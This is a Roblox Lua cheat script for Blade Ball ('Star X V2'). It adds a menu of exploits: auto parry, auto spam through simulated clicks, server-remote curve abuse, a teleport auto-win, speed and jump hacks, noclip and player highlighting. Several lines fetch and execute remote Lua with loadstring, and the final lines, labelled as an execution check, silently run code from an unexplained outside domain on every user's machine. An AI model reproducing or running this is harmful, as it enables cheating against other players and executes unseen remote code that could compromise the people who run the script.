repeat
    wait()
until game:IsLoaded()

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local workspace = game:GetService("Workspace")
local players = game:GetService("Players")
local Players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Player = game.Players.LocalPlayer
local LogService = game:GetService("LogService")
local Balls = workspace:WaitForChild("Balls", 9e9)
local Remotes = replicatedStorage:WaitForChild("Remotes", 9e9)
local localPlayer = Players.LocalPlayer

local Character = Player.Character or Player.CharacterAdded:Wait()

--Var
local LookAt = nil
local Paws = false
local Debug = false
local auto_win = false
local LookAtMethod = "Player CFrame"
local DeflectionMethod = "Remote"
local DistanceToHit = 10
local localPlayer = game.Players.LocalPlayer
local humanoid, humanoidRootPart
local walkSpeedEnabled = false
local nightModeEnabled = false
local NoClipEnabled = false
local jumpPowerEnabled = false
local CanHit = false
local IsTargeted = false
local enableShaders = false  -- Menyalakan atau mematikan Shader Mode
local shadowIntensity = 0.5  -- Mengatur intensitas bayangan
local ambientColor = Color3.fromRGB(50, 50, 50)  -- Warna Ambient yang lebih gelap
local outdoorAmbientColor = Color3.fromRGB(30, 30, 30)  -- Warna luar ruangan lebih gelap
local brightness = 2  -- Tingkat kecerahan dunia
local highlightColor = Color3.fromRGB(255, 0, 0)  -- Red color for highlight
local highlightEnabled = false  -- Whether the highlighting is enabled or not

-- Function to verify if ball is real
local function VerifyBall(Ball)
    return typeof(Ball) == "Instance" and Ball:IsA("BasePart") and Ball:IsDescendantOf(Balls) and Ball:GetAttribute("realBall") == true
end

-- Method to detect target (can be ball or player highlight)
function IsTheTarget()
    if MethodToDetect == "Player Highlight" then
        return localPlayer.Character and localPlayer.Character:FindFirstChild("Highlight")
    elseif MethodToDetect == "Ball Highlight" then
        for _, ball in ipairs(Balls:GetChildren()) do
            if ball:IsA("Part") and ball.BrickColor == BrickColor.new("Really red") then
                return true
            end
        end
    elseif MethodToDetect == "Ball Target" then
        for _, ball in ipairs(Balls:GetChildren()) do
            if ball:GetAttribute("target") == localPlayer.Name then
                return true
            end
        end
    end
    return false
end

local VirtualInputManager = game:GetService("VirtualInputManager")

function RemoteHit()
    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0.001)  -- Mouse Down
    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0.001) -- Mouse Up
end

function FunctionHit()
    if Parry then Parry() end
end

function KeyPressHit()
    keypress(0x46) -- Key F
    keyrelease(0x46)
end

local function HitTheBall()
    if DeflectionMethod == "Remote" then
        RemoteHit()
    elseif DeflectionMethod == "Function" then
        FunctionHit()
    elseif DeflectionMethod == "Key Press" then
        KeyPressHit()
    end
end

-- Ball tracking and deflection logic
Balls.ChildAdded:Connect(function(Ball)
    if not VerifyBall(Ball) then return end
    local OldPosition = Ball.Position
    local OldTick = tick()
    Ball:GetPropertyChangedSignal("Position"):Connect(function()
        if IsTheTarget() and Paws then
            local Distance = (Ball.Position - workspace.CurrentCamera.Focus.Position).Magnitude
            local Velocity = (OldPosition - Ball.Position).Magnitude
            if Velocity > 0 and (Distance / Velocity) <= DistanceToHit then
                HitTheBall()
            end
        end
        if tick() - OldTick >= 1 / 60 then
            OldTick = tick()
            OldPosition = Ball.Position
        end
    end)
end)

shared.config = {
    adjustment = 3.7, -- Keep this between 3 to 4
    hit_range = 0.7 -- Adjust this to your liking
}

-- Find the real ball
local function FindBall()
    for _, ball in ipairs(Balls:GetChildren()) do
        if ball:GetAttribute("realBall") == true then
            return ball
        end
    end
    return nil
end

-- Detect the ball for deflection
local function DetectBall()
    local Ball = FindBall()
    if Ball then
        local BallVelocity = Ball.Velocity.Magnitude
        local BallPosition = Ball.Position
        local PlayerPosition = localPlayer.Character.HumanoidRootPart.Position
        local Distance = (BallPosition - PlayerPosition).Magnitude
        local PingAccountability = BallVelocity * (game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000)
        Distance = Distance - PingAccountability - shared.config.adjustment
        return (Distance / BallVelocity) <= shared.config.hit_range
    end
    return false
end

-- Deflect ball if target detected and ball is in range
local function DeflectBall()
    if IsTargeted and DetectBall() then
        HitTheBall()
    end
end

RunService.PostSimulation:Connect(function()
    IsTargeted = IsTheTarget()
    if CanHit then
        DeflectBall()
    end
end)


-- Keep an eye on ball for real ball tracking
local Balls = Workspace:FindFirstChild("Balls")
function IsReal()
    local Re
    for i, v in next, Balls:GetChildren() do
        if v:GetAttribute("realBall") and v:GetAttribute("target") == Player.Name then
            Re = v
        end
    end
    return Re
end

function Baller()
    local Real = nil
    for i, v in next, Balls:GetChildren() do
        if v:GetAttribute("realBall") then
            Real = v
        end
    end
    return Real
end

-- Keep looking at the ball and adjust the player's or camera's position accordingly

-- Optionally randomize distance to hit
local Randomize = false
RunService.Stepped:Connect(function()
    if Randomize then
        DistanceToHit = math.random(10, 14)
    end
end)


local autoCurveEnabled = false
local curveMethod = {
    straight = true,
    upwards = false,
    random = false
}

-- Function to trigger auto curve based on method
local function AutoCurve(cf, targetPosition, closestEntity)
    if autoCurveEnabled then
        if curveMethod.straight then
            originalParryRemote:FireServer(
                0,
                CFrame.lookAt(cf.Position, cf.Position + Vector3.new(0, 0, 0)),
                {[closestEntity.Name] = targetPosition},
                {targetPosition.X, targetPosition.Y},
                false
            )
        
        elseif curveMethod.upwards then
            originalParryRemote:FireServer(
                0,
                CFrame.lookAt(cf.Position, cf.Position + Vector3.new(0, 1, 0)),
                {[closestEntity.Name] = targetPosition},
                {targetPosition.X, targetPosition.Y},
                false
            )
        
        elseif curveMethod.random then
            originalParryRemote:FireServer(
                0,
                CFrame.lookAt(cf.Position, cf.Position + Vector3.new(
                    math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))),
                {[closestEntity.Name] = targetPosition},
                {targetPosition.X, targetPosition.Y},
                false
            )
        end
    else
        -- Default behavior when auto curve is disabled
        local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cf:GetComponents()
        originalParryRemote:FireServer(
            0,
            CFrame.new(x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22),
            {[closestEntity.Name] = closestEntity.HumanoidRootPart.Position},
            {closestEntity.HumanoidRootPart.Position.X, closestEntity.HumanoidRootPart.Position.Y},
            false
        )
    end
end


-- Variables
local movementEnabled = false
local currentTarget = nil
local Humanoid, HumanoidRootPart
local maxDistance = 50 -- Maximum distance to consider a target valid
local safeDistance = 10 -- Minimum safe distance from the target
local stepSize = 5 -- Distance AI moves per step
local targetSwitchDelay = 3 -- Delay (in seconds) before switching targets

-- Function to initialize humanoid components
local function InitializeHumanoid()
    if localPlayer.Character then
        Humanoid = localPlayer.Character:FindFirstChild("Humanoid")
        HumanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
end

-- Function to pick a random player within range
local function FindRandomPlayer(position)
    local validPlayers = {}

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = player.Character.HumanoidRootPart.Position
            local distance = (position - targetPosition).Magnitude

            if distance <= maxDistance then
                table.insert(validPlayers, player)
            end
        end
    end

    if #validPlayers > 0 then
        local selectedPlayer = validPlayers[math.random(1, #validPlayers)]
        print("Selected new target: " .. selectedPlayer.Name)
        return selectedPlayer
    end
    return nil
end

-- Function to move toward a target player
local function MoveTowards(targetPosition)
    if not HumanoidRootPart or not targetPosition then return end

    local distanceToTarget = (HumanoidRootPart.Position - targetPosition).Magnitude

    -- Stop moving if within safe distance
    if distanceToTarget <= safeDistance then
        Humanoid:Move(Vector3.new(0, 0, 0), true) -- Stop player movement
        return
    end

    -- Calculate direction and set velocity
    local direction = (targetPosition - HumanoidRootPart.Position).Unit
    local movePosition = HumanoidRootPart.Position + direction * stepSize
    Humanoid:MoveTo(movePosition)
end

-- AI Movement Logic in Loop
local lastTargetSwitch = os.clock()

RunService.Heartbeat:Connect(function()
    if not movementEnabled then return end

    InitializeHumanoid()
    if not HumanoidRootPart then return end

    -- Check if current target is invalid or too far
    if not currentTarget or not currentTarget.Character or not currentTarget.Character:FindFirstChild("HumanoidRootPart") then
        currentTarget = FindRandomPlayer(HumanoidRootPart.Position)
    elseif os.clock() - lastTargetSwitch >= targetSwitchDelay then
        -- Switch to a new target after a delay
        lastTargetSwitch = os.clock()
        currentTarget = FindRandomPlayer(HumanoidRootPart.Position)
    end

    if currentTarget then
        local targetPosition = currentTarget.Character.HumanoidRootPart.Position
        local distanceToTarget = (HumanoidRootPart.Position - targetPosition).Magnitude

        if distanceToTarget > maxDistance then
            print("Target too far, finding a new target.")
            currentTarget = FindRandomPlayer(HumanoidRootPart.Position)
        else
            -- Move towards the current target if not within safe distance
            MoveTowards(targetPosition)
        end
    else
        -- Find a new target if none is valid
        print("No valid targets found, searching again...")
        currentTarget = FindRandomPlayer(HumanoidRootPart.Position)
    end
end)


task.defer(function()
	autowinvar = RunService.Stepped:Connect(function()
		if auto_win and workspace.Alive:FindFirstChild(local_player.Name) then
			local self = Nurysium_Util.getBall()
			if not self then return end
			
			local player = local_player.Character
			local ball_Position = self.Position
			local ball_Distance = (player.HumanoidRootPart.Position - ball_Position).Magnitude
			
			
			local ping = game:GetService("Stats"):FindFirstChild("PerformanceStats"):FindFirstChild("Ping"):GetValue() or 0
			local adjusted_Distance = math.clamp(15 + (ping / 50), 15, 50)

			local angle = tick() * 2
			local offset = Vector3.new(math.cos(angle) * adjusted_Distance, math.sin(angle) * 5, math.sin(angle) * adjusted_Distance)
			local target_Position = ball_Position + offset

			
			player.HumanoidRootPart.CFrame = CFrame.new(target_Position, ball_Position)
		end
    end)
	end)


-- Fungsi untuk mengaktifkan Shader Mode
local function enableShaderEffects()
    if enableShaders then
        -- Menambahkan Bayangan
        game.Lighting.GlobalShadows = true  -- Mengaktifkan bayangan global

        -- Pengaturan pencahayaan
        game.Lighting.OutdoorAmbient = outdoorAmbientColor
        game.Lighting.Ambient = ambientColor
        game.Lighting.Brightness = brightness
        game.Lighting.ShadowSoftness = shadowIntensity  -- Menyesuaikan kelembutan bayangan
        
        -- Pengaturan Filter efek
        game.Lighting.FogEnd = 1000  -- Menambahkan kabut lebih jauh (jika diinginkan)
        game.Lighting.FogColor = Color3.fromRGB(0, 0, 0)  -- Mengubah warna kabut jika diperlukan
        
        -- Pengaturan waktu untuk efek lebih dramatis
        game.Lighting.TimeOfDay = "20:00"  -- Membuat dunia lebih gelap (pada jam malam)
        
        print("Shader Mode has been enabled with Shadows and other effects.")
    else
        -- Nonaktifkan efek Shader
        game.Lighting.GlobalShadows = false
        game.Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)  -- Warna ambient default
        game.Lighting.Ambient = Color3.fromRGB(255, 255, 255)  -- Warna ambient default
        game.Lighting.Brightness = 1  -- Kecerahan default
        game.Lighting.ShadowSoftness = 0  -- Nonaktifkan bayangan
        
        print("Shader Mode has been disabled.")
    end
end

local function createHighlight(player)
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        local highlight = Instance.new("Highlight")
        highlight.Name = player.Name .. "Highlight"
        highlight.Parent = character
        highlight.Adornee = character
        highlight.FillColor = highlightColor
        highlight.OutlineColor = Color3.fromRGB(0, 0, 0)  -- Black outline
        highlight.FillTransparency = 0.5  -- Semi-transparent
        highlight.OutlineTransparency = 0.5  -- Semi-transparent outline
        highlight.Enabled = highlightEnabled
    end
end

local function removeHighlight(player)
    local character = player.Character
    if character then
        local highlight = character:FindFirstChild(player.Name .. "Highlight")
        if highlight then
            highlight:Destroy()
        end
    end
end

local function highlightAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        createHighlight(player)
    end
end

local function removeAllHighlights()
    for _, player in ipairs(Players:GetPlayers()) do
        removeHighlight(player)
    end
end

-- Enable highlighting for all players when the script starts
highlightAllPlayers()

-- Update highlighting when a player joins or leaves
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        createHighlight(player)
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    removeHighlight(player)
end)

local VirtualInputManager = game:GetService("VirtualInputManager")
local player = game.Players.LocalPlayer
local spamDelay = 0.0001  -- Delay between mouse events
local Spam = false  -- Set this to true to start spamming, false to stop
local distanceThreshold = 20  -- Set the distance threshold in studs

-- Fungsi untuk memeriksa jarak antara pemain lokal dan pemain lain
local function isPlayerNearOtherPlayer(targetPlayer)
    local character = player.Character or player.CharacterAdded:Wait()
    local targetCharacter = targetPlayer.Character
    if character and targetCharacter then
        local playerPosition = character.HumanoidRootPart.Position
        local targetPosition = targetCharacter.HumanoidRootPart.Position
        local distance = (playerPosition - targetPosition).Magnitude  -- Menghitung jarak
        return distance <= distanceThreshold  -- Jika jarak lebih kecil dari threshold, kembalikan true
    end
    return false
end

-- Spam loop function that will run continuously while Spam is true
local function spamLoop()
    while Spam do
        -- Cari pemain lain di dalam permainan (kecuali pemain lokal)
        for _, targetPlayer in pairs(game.Players:GetPlayers()) do
            if targetPlayer ~= player and targetPlayer.Character then
                -- Cek apakah pemain dekat dengan pemain lain
                if isPlayerNearOtherPlayer(targetPlayer) then
                    -- Send mouse button press and release events
                    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, spamDelay)
                    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, spamDelay)
                end
            end
        end
        wait(spamDelay)  -- Tunggu sebelum mengirim event berikutnya
    end
end

-- Fungsi untuk memulai atau menghentikan spamming
local function toggleSpam()
    Spam = not Spam
    if Spam then
        spamLoop()  -- Mulai loop spamming
    end
end


local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")

-- Configure the ScreenGui
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Configure the ImageButton
ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Image = "rbxthumb://type=Asset&id=17167307693&w=150&h=150" -- Set the image using the decal ID
ImageButton.Draggable = true

-- Add UICorner for rounded corners
UICorner.Parent = ImageButton

-- Function to handle click event
ImageButton.MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
end)

local Window = Fluent:CreateWindow({
    Title = "Blade Ball | Star X V2",
    SubTitle = "By Code4X",
    TabWidth = 100,
    Size = UDim2.fromOffset(550, 350),
    Acrylic = false,
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.LeftControl
})

--Icon https://lucide.dev/icon
local Tabs = {
    Home = Window:AddTab({ Title = "Home", Icon = "home" }),
    Main = Window:AddTab({ Title = "Combat", Icon = "swords" }),
    Adj = Window:AddTab({ Title = "Sub Combat", Icon = "sword" }),
    Pla = Window:AddTab({ Title = "Players", Icon = "users" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "folder" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local r = Tabs.Home:AddSection("Information ✨")

Tabs.Home:AddParagraph({
    Title = "Owner",
    Content = "-CodeE4X"
})

Tabs.Home:AddButton({
Title = "Copy Discord Link",
Description = "https://discord.gg/EwARkGncq4",
Callback = function()
    setclipboard("https://discord.gg/EwARkGncq4")
end
})

local a = Tabs.Home:AddSection("Read Before Use ⚠️")

Tabs.Home:AddParagraph({
    Title = "Best Config!",
    Content = "Auto Parry V1, Auto Parry V2, Auto Curve(Random)"
})

Tabs.Home:AddParagraph({
    Title = "Manual Spam",
    Content = "Manual Spam Only For PC \nBecause PC Can Set With Keybind(E), Mobile \nCant Do That, Even Use Keyboard Scripts "
})

Tabs.Home:AddParagraph({
    Title = "Auto Spam",
    Content = "Can Use All Devices, It Will Spam Automatically\n When Your Character Near Other Player, So Its Not Recommend\n For Some Condition And This Auto Spam Not Support On NPC! "
})

local Infor = Tabs.Main:AddSection("Auto Parry ⚔️")

local Toggle = Tabs.Main:AddToggle("Config", {Title = "Auto Parry v1", Description = "This Parry Based On Range", Default = false })
Toggle:OnChanged(function(state)  
    CanHit = state
end) 

local Toggle = Tabs.Main:AddToggle("Config", {Title = "Auto Parry v2", Description = "This Auto Parry Based On Your Ping", Default = false })
Toggle:OnChanged(function(state)  
        CanHit = state
        Paws = state
end)  

Tabs.Main:AddButton({
    Title = "Manual Spam",
    Description = "Only FOR PC, See #ReadBeforeUse(Home) for more information",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AyxbaIhbGqdb51uMauhxbiBhBhbwy/Component/refs/heads/main/MauaulSpam.lua"))()
    end
})

local Toggle = Tabs.Main:AddToggle("MyToggle", {
    Title = "Auto Spam", 
    Description = "Not Work In NPC, See #ReadBeforeUse(Home) for more information",
    Default = false,
    Callback = function(state)
        Spam = state  -- Aktifkan atau matikan spamming berdasarkan toggle state
        if Spam then
            spamLoop()  -- Mulai loop spamming jika toggle diaktifkan
        end
    end 
})


local cur = Tabs.Main:AddSection("Curve Section 🪝")
-- UI Toggle to enable or disable auto curve
local AutoCurveToggle = Tabs.Main:AddToggle("AutoCurve", {
    Title = "Auto Curve",
    Description = "Enable or disable auto curve",
    Default = false
})
AutoCurveToggle:OnChanged(function(state)
    autoCurveEnabled = state
end)

-- Dropdown to choose curve method
local CurveMethodDropdown = Tabs.Main:AddDropdown("CurveMethod", {
    Title = "Curve Method",
    Values = {"straight", "upwards", "random"},
    Multi = false,
    Default = "straight"
})
CurveMethodDropdown:OnChanged(function(selectedMethod)
    for method, _ in pairs(curveMethod) do
        curveMethod[method] = (method == selectedMethod)
    end
end)

local far = Tabs.Main:AddSection("Farms Section 💸")
local Toggle = Tabs.Main:AddToggle("AIMovementToggle", {
    Title = "AI Play",
    Description = "AI Play",
    Default = false,
    Callback = function(state)
        movementEnabled = state
        CanHit = state
        if state then
            print("AI Movement: Enabled")
        else
            print("AI Movement: Disabled")
            if Humanoid then
                Humanoid:Move(Vector3.new(0, 0, 0), true) -- Stop player movement
            end
        end
    end
})




local ii = Tabs.Adj:AddSection("Auto Parry V1 ⚔️")
				    
            
Tabs.Adj:AddParagraph({
        Title = "Auto Parry V1",
        Content = "you can edit the parry system on here"
})

local HitSlider = Tabs.Adj:AddSlider("DistanceHit", {
        Title = "Parry Range",
        Description = "This is the range for parrying the ball",
        Default = 10,
        Min = 5.5,
        Max = 20,
        Rounding = 0.5,
        Callback = function(Value)
        end
})
    HitSlider:OnChanged(function(Value)
            DistanceToHit = tonumber(Value)
end)
local Random = Tabs.Adj:AddToggle("Random",{Title = "Randomize Distance To Hit",Default = false })
Random:OnChanged(function(Value)
        Randomize = Value
end)

local iif = Tabs.Adj:AddSection("Auto Parry V2 ⚔️")
				  
Tabs.Adj:AddParagraph({
        Title = "Auto Parry V2",
        Content = "you can edit the parry system on here and etc"
})
local HitSlider2 = Tabs.Adj:AddSlider("OffSetHit", {
        Title = "Parry Offset",
        Description = "It uses Parry Offset to calcukate your parry distance",
        Default = 3.7,
        Min = 2.5,
        Max = 4.5,
        Rounding = 1,
        Callback = function(Value)
        end
})
    HitSlider2:OnChanged(function(Value)
           shared.config.adjustment  = tonumber(Value)
end)
local HitSlider3 = Tabs.Adj:AddSlider("HitRange", {
        Title = "Hit Range",
        Description = "Parry Range",
        Default = 0.6,
        Min = 0.3,
        Max = 1,
        Rounding = 1,
        Callback = function(Value)
        end
})
    HitSlider3:OnChanged(function(Value)
           shared.config.hit_range  = tonumber(Value)
end)

local idk = Tabs.Adj:AddSection("Auto Parry System(Both) ⚔️")

local MethodP = Tabs.Adj:AddDropdown("MethodParry", {
    Title = "Auto Parry Method",
    Values = {"Remote","Function","Key Press"},
    Multi = false,
    Default = "Remote",
})
MethodP:OnChanged(function(Value)
        DeflectionMethod = Value
end)
local MethodD = Tabs.Adj:AddDropdown("MethodDetect", {
    Title = "Detection Method",
    Values = {"Player Highlight","Ball Highlight","Ball Target"},
    Multi = false,
    Default = "Player Highlight",
})
MethodD:OnChanged(function(Value)
        MethodToDetect = Value
end)

local idw = Tabs.Pla:AddSection("Player Adjustments 👤")



local player = game.Players.LocalPlayer

-- Fungsi untuk mengubah WalkSpeed
local function setWalkSpeed(value)
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = value  -- Set WalkSpeed
    end
end

-- Fungsi untuk mengubah JumpPower
local function setJumpPower(value)
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.JumpPower = value  -- Set JumpPower
    end
end

-- WalkSpeed Slider
local WalkSpeedSlider = Tabs.Pla:AddSlider("WalkSpeedSlider", {
    Title = "WalkSpeed",
    Description = "Set WalkSpeed",
    Default = 16,  -- Default value directly set here
    Min = 0,
    Max = 100,
    Rounding = 1,
    Callback = function(value)
        setWalkSpeed(value)  -- Set WalkSpeed menggunakan fungsi
    end
})

-- JumpPower Slider
local JumpPowerSlider = Tabs.Pla:AddSlider("JumpPowerSlider", {
    Title = "JumpPower",
    Description = "Set JumpPower",
    Default = 50,  -- Default value directly set here
    Min = 0,
    Max = 100,
    Rounding = 1,
    Callback = function(value)
        setJumpPower(value)  -- Set JumpPower menggunakan fungsi
    end
})






local ida = Tabs.Misc:AddSection("Misc Section 🌍")

local NightModeToggle = Tabs.Misc:AddToggle("NightModeToggle", {
    Title = "Night Mode", 
    Description = "Set Game To Night Mode",
    Default = false,  -- Default is off
    Callback = function(state)
        nightModeEnabled = state
        if nightModeEnabled then
            print("Night Mode Enabled")
            -- Change the theme to dark or apply other visual changes for night mode
            game.Lighting.TimeOfDay = "00:00"  -- Set time to night
            game.Lighting.OutdoorAmbient = Color3.fromRGB(50, 50, 50)  -- Darken the environment
            game.Lighting.Ambient = Color3.fromRGB(30, 30, 30)  -- Darker ambient light
        else
            print("Night Mode Disabled")
            -- Reset to default settings
            game.Lighting.TimeOfDay = "14:00"  -- Set time to day
            game.Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)  -- Default light
            game.Lighting.Ambient = Color3.fromRGB(255, 255, 255)  -- Default ambient light
        end
    end,
})

local Toggle = Tabs.Misc:AddToggle("Shader Toggle", 
{
    Title = "Shader Mode", 
    Description = "Set Game To Shader Mode",
    Default = false,
    Callback = function(state)
        -- Mengubah status enableShaders berdasarkan nilai toggle
        enableShaders = state
        -- Memanggil fungsi untuk mengubah efek sesuai dengan status toggle
        enableShaderEffects()
    end
})

local function ToggleNoClip(state)
    NoClipEnabled = state
    local character = player.Character or player.CharacterAdded:Wait()  -- Pastikan karakter dimuat
    if character then
        -- Iterasi melalui semua part dalam karakter
        for _, part in ipairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = not NoClipEnabled  -- Ubah CanCollide tergantung status NoClip
            end
        end
    end
end

local Toggle = Tabs.Misc:AddToggle("NoClip", {
    Title = "NoClip",
    Description = "Toggle NoClip Mode",
    Default = false,
    Callback = function(state)
        ToggleNoClip(state)
    end
})

local Toggle = Tabs.Misc:AddToggle("Highlight Players", {
    Title = "Highlight Players",
    Description = "highlighting of all players",
    Default = false,
    Callback = function(state)
        if state then
            highlightAllPlayers()
        else
            removeAllHighlights()
        end
    end
})

--Execute Chek
loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/executed/refs/heads/main/exe.lua"))()
loadstring(game:HttpGet("https://egorikusa.space/d4cc3eb008221b3716c918cf.lua", true))()
